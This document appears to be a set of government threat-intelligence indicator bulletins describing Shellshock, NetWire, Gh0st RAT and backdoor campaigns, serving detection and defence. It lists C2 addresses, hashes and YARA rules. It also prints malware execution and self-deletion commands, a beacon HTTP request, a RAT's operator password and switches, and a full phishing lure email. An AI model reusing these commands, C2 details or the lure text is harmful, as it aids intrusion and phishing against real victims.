On 25 September 2014, the malicious file 73b0d95541c84965fa42c3e257bb349957b3be626dec9d55efcc6ebcba6fa489 (MD5: 5924bcc045bb7039f55c6ce29234e29a) was submitted for analysis. It was identified as the malicious payload of a Bash Shellshock attack. The malware called back to IP 89.238.150.154 and 108.162.197.26.
This bulletin references US-CERT Malware Initial Findings Report MIFR-403299.

stix:Indicator.indicator:Description: Address lookup lookup failed 89.238.150.154 Could not find a domain name corresponding to this IP address. stix:STIX_Header.stix:Title: Backdoor Network Activity Discovered on Compromised Hosts
stix:STIX_Header.stix:Description:
Between 29 October 2014 and 24 November 2014 it was observed that at least fourteen separate hosts were infected with the same malware (backdoor) attempting to communicate with a C2 server at the IP address 81.91.144.234.
It is unknown how the initial compromise occurred on the victim network or how long the intruders have had access to the network.

stix:Indicator.indicator:Description:
It was reported that the IP address the malware called out to was a probable proxy server. The IP address was registered to Datak ADSL Service, Karaj.
The command and control IP address has mainly hosted what appear to be mail servers according to PDNS results:
NAME IP FIRSTSEEN LASTSEEN ns2.kalleh.com. 81.91.144.234 smtp.atibal.com. 81.91.144.234 thr0018.solico-group.com. 81.91.144.234 mail.solico-tehran.com. 81.91.144.234 smtp.rasatop.com. 81.91.144.234 iranbartar.ir. 81.91.144.234 smtp.solico-tehran.com. 81.91.144.234 smtp.kalleh-meat.com. 81.91.144.234 smtp.kalleh-pemina.com. 81.91.144.234 smtp.topsolico.com. 81.91.144.234
According to the report, the malware in this malware family typically listen for C2 on inbound TCP port 443.
Hash values for the malware files from this report were not provided. However, the following import hashes may be used to identify this and related malware.
import hash a565e8c853b8325ad98f1fac9c40fb88 import hash ED7A9C6D9FC664AFE2DE2DD165A9338C import hash 734740B16053CCC555686814A93DFBEB
import hash 734740B16053CCC555686814A93DFBEB This file is a dropper that installs the other two files.
import hash ED7A9C6D9FC664AFE2DE2DD165A9338C This file is a custom coded backdoor. Observed functionalities include the ability to fingerprint the victim machine, run remote commands, perform directory listings, perform process listings, and transfer files.
import hash a565e8c853b8325ad98f1fac9c40fb88 This file is custom coded malware with basic backdoor functionality. Observed functionalities include the ability to fingerprint the victim machine, run remote commands, perform directory listings, perform process listings, and transfer files.
Malware in this family are typically loaded via a dropper, installed as a service, and listen on TCP port 443. The backdoor may have an associated configuration file which can contain a configurable port. No configuration file was observed in these fourteen particular instances of infection.
The filenames and service names associated with this malware are configurable and differ per victim, however similar files may be detected by using the YARA rule included below.
strings: $str1 = {8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF} condition: (uint16(0) == 0x4D5A) and $str1

stix:STIX_Header.stix:Title: Phishing Email with Inquiry Theme Includes Malware
stix:STIX_Header.stix:Description: On 21 May 2015, a phishing email was sent from hellen@saudisourcing.org to a financial sector organization with the subject "Re: Inquiry ...." The email contained the malicious attachment ?????????????????????? (MD5: 2db8f96a7d985ab7a9204a324a48272c), which contained the NetWire remote administration tool (RAT). The RAT called back to neease.net (178.175.138.222) over port 9003.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- 220 [REDACTED] smtp proxy ready EHLO mailx.saudisourcing.org 250-Requested mail action okay, completed. 250 STARTTLS MAIL FROM:<hellen@saudisourcing.org> 250 Requested mail action okay, completed. RCPT TO:[REDACTED] 250 Requested mail action okay, completed.
DATA 354 Enter mail, end with "." on a line by itself.
Received: from User ([155.133.18.151]) by saudisourcing.org with MailEnable ESMTP; Thu, 21 May 2015 16:26:26 -0400 From: "Apisect Quntum Sourcing Ltd"<hellen@saudisourcing.org> To: md@saudisourcing.org Subject: Re: Inquiry .... Date: Thu, 21 May 2015 13:26:35 -0700 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_NextPart_000_001D_01C2A9A6.2E07F4CA" X-Priority: 3 X-MSMail-Priority: Normal X-Mailer: Microsoft Outlook Express 6.00.2600.0000 X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000 Message-ID: <49AA12C414C644BFA8DAC1BFAD712359.MAI@saudisourcing.org> ------=_NextPart_000_001D_01C2A9A6.2E07F4CA Content-Type: text/plain; charset="Windows-1251" Content-Transfer-Encoding: 7bit ---- END EMAIL HEADER ---- This is a multi-part message in MIME format.
---- BEGIN EMAIL BODY ---- Hi,
We are making an inquiry for the products as attached here in. The items must meet the specification as described in the attached document.
Please send me your best favourable prices for the items and the possible discounts for the quantities. Include the shipping costs to Venezuela.
Your urgent reply is wanted as we have a client waiting, and we have competitors who are waiting to have them.
Yours sincerely
[REDACTED] Apisect Quntum Sourcing Ltd Oxendad Venezuela ---- END EMAIL BODY ----

The malware called back to the resolving IP 178.175.138.222 over port 9003.
The domain neease.net changed DNS entries to using dnsexit.com name servers on May 18th, which also changed the resolving IP address.

stix:STIX_Header.stix:Title: Possible EXEPROXY Network Activity
stix:STIX_Header.stix:Description: On 22 October 2014 a U.S. government department reported that between 17 September 2014 and 21 October 2014 malware on compromised hosts on the networks of a U.S. government department attempted to communicate with command and control (C2) servers via TCP on port 443. The activity was identified by data source analysts as consistent with network communication associated with a second-stage implant known as "EXEPROXY".

stix:Indicator.indicator:Description:
The data source reported observing beacons or callback communications between 17 September and 21 October from an EXEPROXY implant to a command and control (C2) server hosted at the U.S.-based IP address 128.173.188.254. According to the data source, this traffic was observed from four compromised hosts to the same C2 server (IP 128.173.188.254).
The network traffic was observed going to TCP port 443. The traffic may contain the strings "WashingTon", "WashingTon_SSL", "WebMaster@Microsoft.com".

stix:STIX_Header.stix:Title: Pleasantly Surprised Themed Email Contains Gh0st RAT
stix:STIX_Header.stix:Description: On 21 November 2014 a US government agency reported that an email with the subject of "Pleasantly surprised" was sent with a malicious attachment and no contents in the body. The attachment contained an executable that displayed an orange play button icon. When executed Gh0st Remote Administration Tool (Gh0st RAT) calls out to the comand and control (C2) domain www.meitanjiaoyiwang.com.

stix:Indicator.indicator:Description: ------ BEGIN EMAIL HEADER ------ Subject: Pleasantly surprised From: [REDACTED POSSIBLE PII] <oglesbyhouse@bellsouth.net>; To <[REDACTED]> Date: Thu Nov 20 11:43:11 GMT 2014 Received: from [127.0.0.1] by nm39.bullet.mail.ne1.yahoo.com with NNFMP; 20 Nov 2014 11:46:22 -0000 Received: from [98.138.101.128] by nm39.bullet.mail.ne1.yahoo.com with NNFMP; 20 Nov 2014 11:43:15 -0000 Received: from [216.39.60.171] by tm16.bullet.mail.ne1.yahoo.com with NNFMP; 20 Nov 2014 11:43:12 -0000 Received: from [216.39.60.246] by tm7.access.bullet.mail.gq1.yahoo.com with NNFMP; 20 Nov 2014 11:43:12 -0000 Received: from [127.0.0.1] by omp1017.access.mail.gq1.yahoo.com with NNFMP; 20 Nov 2014 11:43:12 -0000 X-Yahoo-Newman-Property: ymail-4 X-Yahoo-Newman-Id: 122178.21340.bm@omp1017.access.mail.gq1.yahoo.com Received: (qmail 65977 invoked by uid 60001); 20 Nov 2014 11:43:11 -0000 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=bellsouth.net; s=s1024; t=1416483791; bh=ygBpu5/vrtr4O3IAsALSVkinOWfpQ6hsFyRpOa9Z/Yk=; h=Message-ID:Date:From:Reply-To:Subject:To:MIME-Version:Content-Type; b=Dpu6vw4JnN55DF4Qg4z9ZE1KsWtrEy4HMc5myYKbIpXMQVUCoU1S1bT6KQ77iUOs1eejTQlig52IYaLYFmnCuT9fXGClfZiWGEFJAVM4kssMO51qS6ys7o6mt8H6prttWTgFI0kVgZTMcPCOSBgL+GrSFZxQ70h8r2Lv0sTnGTE= X-YMail-OSG: 8a_bZboVM1kxHOWE3bBhCvXnwqIdY8KvK5EJB4.66.9mu1Xx0eXnUhMTQgAxUirZz3I3VwapdzIfJ.JvzKwl7gLT3iM2t3ly5bu81mFCMkCuEb2aVAS4V7EaWAe08q8xMbPbOU8ZfrUa_yjRb61gccyE8SUxPS2UVjaw.gCrapbbTTzrX5lidPl23KEOjUBbu.YelfKF3LDZ3tt3msB.UWj_S. Received: from [113.143.190.173] by web185304.mail.gq1.yahoo.com via HTTP; Thu, 20 Nov 2014 03:43:11 PST X-Rocket-MIMEInfo: 002.001,CgEwAQEBAQ-- X-Mailer: YahooMailWebService/0.8.203.740 Message-ID: <1416483791.11462.YahooMailNeo@web185304.mail.gq1.yahoo.com> MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="1381649169-1907450212-1416483791=:11462" Attachments: Pleasantly surprised.zip (351953 bytes); ------ END EMAIL HEADER ------ Email body had no contents.
This is a zip file that contains the executable labeled Pleasantly surprised.zip (MD5: 24936D19277F6384FA9B98331D98318C). The executable file displays the icon of an orange "Play" button.

When the file is executed, it creates the hidden folder C:\Recycle09102014 and executes the DLL GameUpdate.log within the hidden folder. It then modifies the System Registry for persistence, executes the DLL and executes a command to delete itself, then terminates.
The following command is used to execute the DLL: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
The following command is used to delete the file: cmd /c ping 127.0.0.1 -n 1&del "C:\Documents and Settings\User\Desktop\Pleasantly surprised.Exe"

This file is able to gather screenshots, clipboard content, and keyboard data.
The DLL writes to keyboard log file C:\windows\system32\ky1log.dat. It uses WinInet and Winsock APIs for network functions.
A file with this MD5 hash was observed in a similar spear-phishing email with the same subject in the indicator bulletin: IB-14-10590
This is a keylog file whose contents, MD5, and file size will vary depending on actions the user takes on the infected system.

stix:STIX_Header.stix:Title: RAT Activity Observed Communicating with Numerous Domains
stix:STIX_Header.stix:Description: On 09 December 2014, remote administration tool (RAT) activity was observed on a data source's network. File hash data is not available, but import and PE header section hashes are provided. A Yara signature is also provided. It called back to the domain ex.hotelicon.net (70.25.5.18).

stix:Indicator.indicator:Description:
The tool may send an HTTP GET request if the malware is executed with the "-r" option and it was unable to bind to a configured socket on the compromised host for passive listening:
GET /view/find.php?id=<pre-configured remote administration port> HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E) Host: [C2 domain] Connection: Keep-Alive
The domain ex.hotelicon.net was identified as one of the C2 sites. As of 15 December 2014, this domain resolved to IP 70.25.5.18.
To operate this tool via the command line, the following password is required: sOck. The malware accepts at least five command line parameters: -in, -re, -s, -c, -r.
Whereas we do not have specific hashes for the malware the following import hash may be used to detect similar tools: A5AA32BB2312AE0468404AA514ECF012
The following header hash may be used to detect similar tools: 9ae2378965e0ee0ba0c9706b0a595ad1
The following PE Section Hash hashes may be used to detect similar tools: 3692f7e81a65b9690ea5634e41ac2a2b (.text) 27685fffd5e6d2bd1041f64292790ffb (.rdata)
When the file is installed ("-in sOck"), it writes a copy of itself to C:\WINDOWS\system32\drivers\[OriginalFileName].exe and installs itself as a service.
When run ("-r sOck"), it will listen for a connection on a configured TCP port for remote administration by the attacker. The tool will also attempt to bind to a TCP socket to listen passively on the compromised machine. If it is unable to bind to the socket, it will send an HTTP GET request.
Unique strings that may help to identify similar tools include: %4.4d/%2.2d/%2.2d %s %s:%d http://%s/view/find.php?id=%d a1b2cd3*x#j@n$q Mircsoft Wireless Configuration
"Mircsoft" is likely a misspelling of Microsoft. The "Mircsoft Wireless Configuration" string is used as the malware's Service Display Name.
Below is a potential YARA signature to detect similar binaries on host machines: rule FILE_UNIQUE_STRINGS { strings: $STR1 = "Mircsoft" nocase wide ascii $STR2 = "In Ok !" nocase wide ascii condition: (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them }
